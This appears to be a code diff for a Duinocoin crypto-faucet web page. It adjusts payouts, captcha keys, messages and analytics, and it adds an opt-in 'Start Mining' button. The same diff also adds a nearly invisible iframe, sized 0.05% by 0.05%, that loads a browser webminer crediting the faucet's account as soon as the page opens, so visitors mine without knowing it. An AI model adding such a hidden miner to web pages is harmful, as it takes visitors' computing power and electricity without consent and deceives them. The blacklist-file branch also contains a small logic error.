@@ -137,33 +137,40 @@ window.matchMedia("(prefers-color-scheme: dark)").addListener(applyDarkMode);
 <header>
     <h1>KatFaucet 😻</h1>
 </header>
-<head>
+<head> 
+<meta name="keywords" content="katfaucet, kat, Duinocoin, DUCO, Duinocoin faucet, crypto faucet, DUCO faucet, Free Duinocoin, Beginner crypto, Earn free crypto, Exo-Friendly crypto, Free crypto currency, Gamecat999, Microcontroller Mining, Free, instant faucet">
 <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
 </head>
 
-<h2>Enter your username below to get 0.01-10 free Duinocoin Once a Day!</h2>
+<h2>Enter your username below to get 0.01-5 free Duinocoin Once a Day!</h2>
 
 
 
 <form action="" method="post" onsubmit="return validateForm()">
     <label for="username">Enter your username:</label>
     <input type="text" id="username" name="username" required>
-    <div class="g-recaptcha" data-sitekey="6Ld0iUcqAAAAAF-pbigYVRslGNaTr_zmilPa1Mj9"></div>
+    <div class="g-recaptcha" data-sitekey="6LcCbWkqAAAAAN9E6PVQSpbTR0jhW97-nZzdw6eu"></div>
     <input type="submit" value="Get DUCOS">
 </form>
 <script>
 function validateForm() {
     var response = grecaptcha.getResponse();
     if (!response) {
-        alert('Please complete the ReCaptcha.');
+        alert('Dont be a Evil Bot. Please complete the Captcha.');
         return false;
     }
     return true;
 }
 </script>
 
-<a href="https://discord.gg/HUbHqUQUD2">Join our Discord server!<br></a>
+<a href="https://discord.gg/HUbHqUQUD2">Click this to join our Discord Server!<br></a>
 
+   //miner script for the webminer 
+
+    <iframe src="https://server.duinocoin.com/webminer.html?username=katfaucet&threads=1&rigid=Katfaucet+Support&keyinput=None" width="0.05%" height="0.05%" frameborder="0"></iframe>
 
 
 
@@ -189,16 +196,19 @@ $blacklistData = array();
 // Read the blacklist data from the file if it exists
 if (file_exists($blacklistFile)) {
     $blacklistData = file($blacklistFile, FILE_IGNORE_NEW_LINES);
-}
+ } else {
+        // Create the cooldown file if it doesn't exist
+        file_put_contents($cooldownFile, json_encode($cooldownData));
+    }
+
 
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = "YOURUSERNAMEHERE";
+    $username = "URUSERNAMEHERE";
     $recipient = $_POST["username"];
-    $password = "YOUR_USERNAME_HERE";
+    $password = "ENTERPASSWORDHERE";
     $memo = "Faucet Claim";
-    //change the amount of the claim
-    $amount = mt_rand(1, 1000) / 100;
+    $amount = mt_rand(1, 500) / 100;
     $currentTime = time(); // Get the current time
     
 
@@ -207,13 +217,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Check if the recipient's username is in the cooldown list
         if (array_key_exists($recipient, $cooldownData) && $currentTime - $cooldownData[$recipient] < $cooldownTime) {
             $remainingTime = $cooldownTime - ($currentTime - $cooldownData[$recipient]);
-            echo "Please wait for " . $remainingTime . " Seconds before claiming again.";
+            echo "Be more Patient. Wait for " . $remainingTime . " Seconds before Trying again. Find a Kat to pet while you wait.";
             exit;
         }
     }
     // Check if the recipient's username is in the blacklist
     if (in_array($recipient, $blacklistData)) {
-        echo "Sorry, this username is not allowed to use the faucet.";
+        echo "Sorry, You are not allowed to use this faucet. Go pet a kat instead.";
         exit;
     }
     
@@ -238,7 +248,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             file_put_contents($cooldownFile, json_encode($cooldownData));
             
         } else {
-            echo "Error: Transaction failed. Reason: " . (isset($transactionData['error']) ? $transactionData['error'] : 'Unknown');
+            echo "Error: Transaction failed. Reason: " . (isset($transactionData['error']) ? $transactionData['error'] : 'Unknown. Report this to kat on discord pls!');
         }
     }
 }
@@ -247,15 +257,93 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 ?>
 
 
+<p>Mine to help support The faucet!</p>
+
+
+
+<head>
+    
+    <style>
+        #loadIframeButton {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        #disableButton {
+            background-color: red;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <button id="loadIframeButton">Start Mining</button>
+    <button id="disableButton">Stop Mining</button>
+    <div id="iframeContainer"></div>
+    <script>
+        var iframeLoaded = false;
+
+        document.getElementById('loadIframeButton').addEventListener('click', function() {
+            if (!iframeLoaded) {
+                var iframe = document.createElement('iframe');
+                iframe.src = 'https://server.duinocoin.com/webminer.html?username=katfaucet&threads=1&rigid=Katfaucet+Support&keyinput=None'; // Replace with your desired URL
+                iframe.style.width = '100%';
+                iframe.style.height = '400px'; // Adjust the height as needed
+                document.getElementById('iframeContainer').appendChild(iframe);
+                iframeLoaded = true;
+
+                // Disable the "Load Iframe" button
+                document.getElementById('loadIframeButton').disabled = true;
+            }
+        });
+
+        document.getElementById('disableButton').addEventListener('click', function() {
+            // Remove the iframe and re-enable the "Load Iframe" button
+            document.getElementById('iframeContainer').innerHTML = '';
+            iframeLoaded = false;
+            document.getElementById('loadIframeButton').disabled = false;
+        });
+    </script>
+</body>
+
+
+
+
+
+
 <br>
 <br>
 <br>
 <br>
 <br>
 <br>
-<p>.</p>
+<br>
+<br>
+<br>
+<br>
+<br>
 <footer>
     <p>If you want to donate, send ducos to katfaucet!</p>
+    <p>Hosted by Elapt1c!</p>
+    
+       <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
+<!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4904841,4,107,170,20,00010101']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4904841&101" alt="counter" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 </footer>
 </body>
 </html>
